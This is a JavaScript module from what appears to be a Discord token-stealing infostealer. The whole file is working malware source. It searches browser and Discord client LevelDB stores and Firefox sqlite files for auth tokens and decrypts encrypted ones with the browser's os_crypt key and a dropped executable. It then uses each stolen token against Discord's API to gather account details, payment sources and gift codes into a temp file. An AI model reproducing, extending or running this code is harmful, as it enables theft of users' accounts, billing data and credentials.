const { join } = require('path');
const { browsers } = require('../util/variables');
const { execSync } = require('child_process');
const { readFileSync, existsSync, readdirSync, writeFileSync, statSync } = require('fs');
const axios = require('axios');
const { userAgent } = require('../config');
const { getTempFolder } = require('../util/init');
const { sleep } = require('../util/general');
const { generateString } = require('../util/string');
const os = require('os');

const jsonFile = join(getTempFolder(), 'Discord.json');
writeFileSync(jsonFile, '{}');
const tokens = [];
/**
 * @return Promise<string>
 */
const decryptToken = async (token, key) => {
  try {
    return (await execSync(
      join(getTempFolder(), 'decrypt_token.exe') + ' ' + ['--key', `"${key}"`, '--token', `"${token}"`].join(' ')
    )).toString('utf8')?.trim();
  } catch (e) {
    await sleep(500);
    await decryptToken(token, key);
  }
};
const tokenRegex = /[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}/gi;
const encryptedTokenRegex = /dQw4w9WgXcQ:[^.*['(.*)'\].*$][^"]*/gi;
const tokensNotWorking = join(os.tmpdir(), generateString(10) + '.tmp');
writeFileSync(tokensNotWorking, '');

const decryptRickRoll = (path) => {
  return new Promise((resolve) => {
    const encryptedTokens = [];
    const localStatePath = join(path, 'Local State');
    if (!existsSync(localStatePath)) return;
    const key = JSON.parse(readFileSync(localStatePath).toString())['os_crypt']['encrypted_key'];
    const levelDB = path.includes('cord') ? join(path, 'Local Storage', 'leveldb') : join(path, 'Default', 'Local Storage', 'leveldb');
    if (!existsSync(levelDB)) return;
    readdirSync(levelDB).map(async f => {
      if (f.split('.').pop() !== 'log' && f.split('.').pop() !== 'ldb') return;
      const lines = readFileSync(join(levelDB, f), 'utf8').split('\n').map(x => x.trim());
      lines.forEach(line => {
        line.match(tokenRegex)?.forEach(token => {
          if (!tokens.includes(token)) tokens.push({
            token,
            source: path.replace(process.env.LOCALAPPDATA, '').replace(process.env.APPDATA, '').replace('User Data', '').split('\\').join(' ').trim()
          });
        });
        line.match(encryptedTokenRegex)?.forEach(token => {
          if (token.endsWith('\\')) token = (token.slice(0, -1).replace('\\', '')).slice(0, -1);
          if (!encryptedTokens[token]) encryptedTokens.push(token);
        });
      });
      for (let token of encryptedTokens) {
        token = await decryptToken(token, key);
        if (
          typeof token === 'string' && token.match(tokenRegex) && !tokens.includes(token)
        ) tokens.push({
          token,
          source: path.replace(process.env.LOCALAPPDATA, '').replace(process.env.APPDATA, '').replace('User Data', '').split('\\').join(' ').trim()
        });
      }
      if (tokens.length >= 0) await handleTokens(tokens, resolve);
    });
  });
};

const handleTokens = async (tokens, resolve) => {
  const invalidTokens = readFileSync(tokensNotWorking, 'utf8');
  const userInfo = async (token, source, retry = 0) => {
    try {
      const { data } = await axios.get('https://discord.com/api/v10/users/@me', {
        headers: { Authorization: token, 'User-Agent': userAgent }
      });
      data.token = token;
      data.source = source;
      let info = JSON.parse(readFileSync(jsonFile, 'utf8'));
      if (!info.accounts) info.accounts = [];
      if (!info.accounts.find(account => account.id === data.id)) {
        info.accounts.push(data);
        writeFileSync(jsonFile, JSON.stringify(info));
      } else if (info.accounts.find(account => account.id === data.id && !account.source.includes(source))) {
        info.accounts.find(account => account.id === data.id).source += ', ' + source;
        writeFileSync(jsonFile, JSON.stringify(info));
      }
    } catch (e) {
      if (retry === 10) return;
      if (e.response.status === 401) {
        writeFileSync(tokensNotWorking, readFileSync(tokensNotWorking, 'utf8') + ',' + token);
      } else if (e.response.status === 429 && e.response.data.retry_after) {
        await sleep((e.response.data.retry_after * 1000) + 500);
        await userInfo(token, source, retry + 1);
      }
    }
  };
  const paymentSources = async (token) => {
    try {
      const { data } = await axios.get('https://discord.com/api/v10/users/@me/billing/payment-sources', {
        headers: { Authorization: token, 'User-Agent': userAgent }
      });
      let info = JSON.parse(readFileSync(jsonFile).toString());
      if (!info.billing) info.billing = [];
      data.forEach(billing => {
        if (!info.billing.find(b => b.id === billing.id)) info.billing.push(billing);
      });
      writeFileSync(jsonFile, JSON.stringify(info));
    } catch (e) {
      if (e.response.status === 429 && e.response.data.retry_after) {
        await sleep((e.response.data.retry_after * 1000) + 500);
        await paymentSources(token);
      }
    }
  };
  const gifts = async (token) => {
    try {
      const { data } = await axios.get('https://discord.com/api/v10/users/@me/outbound-promotions/codes', {
        headers: { Authorization: token, 'User-Agent': userAgent }
      });
      let info = JSON.parse(readFileSync(jsonFile).toString());
      if (!info.gifts) info.gifts = [];
      data.forEach(gift => {
        if (!info.gifts.find(g => g.id === gift.id)) info.gifts.push(gift);
      });
      writeFileSync(jsonFile, JSON.stringify(info));
    } catch (e) {
      if (e.response.status === 429 && e.response.data.retry_after) {
        await sleep((e.response.data.retry_after * 1000) + 500);
        await gifts(token);
      }
    }
  };
  for (const { token, source } of tokens) {
    if (invalidTokens.split(',').includes(token)) return;
    await userInfo(token, source);
    await paymentSources(token);
    await gifts(token);
  }
  resolve();
};

module.exports = new Promise(async (resolve) => {
  for (const path of Object.keys(browsers)) {
    if (!existsSync(browsers[path])) continue;
    if (path.includes('Firefox')) {
      const search = execSync('where /r . *.sqlite', { cwd: browsers[path] }).toString();
      if (search) {
        search.split(/\r?\n/).forEach((filePath) => {
          filePath = filePath.trim();
          if (!existsSync(filePath) || !statSync(filePath).isFile()) return;
          const lines = readFileSync(filePath, 'utf8').split('\n').map(x => x.trim());
          lines.forEach((line) => {
            const tokensMatch = line.match(tokenRegex);
            if (tokensMatch) {
              tokensMatch.forEach((token) => {
                if (
                  // Each number is the first number a Discord User ID contains, depending on which Discord API
                  // version they account was created
                  !token.startsWith('MTg') && // 1
                  !token.startsWith('MjI') && // 2
                  !token.startsWith('MzM') && // 3
                  !token.startsWith('NDU') && // 4
                  !token.startsWith('NTE') && // 5
                  !token.startsWith('NjU') && // 6
                  !token.startsWith('NzM') && // 7
                  !token.startsWith('ODA') && // 8
                  !token.startsWith('OTk') && // 9
                  !token.startsWith('MTA') && // 10
                  !token.startsWith('MTE')    // 11
                ) return;
                if (!tokens.includes(token)) tokens.push({ token, source: 'Mozilla Firefox' });
              });
            }
          });
        });
      }
      await handleTokens(tokens, resolve);
    } else {
      decryptRickRoll(browsers[path]).then(async () => await handleTokens(tokens, resolve));
    }
  }
});
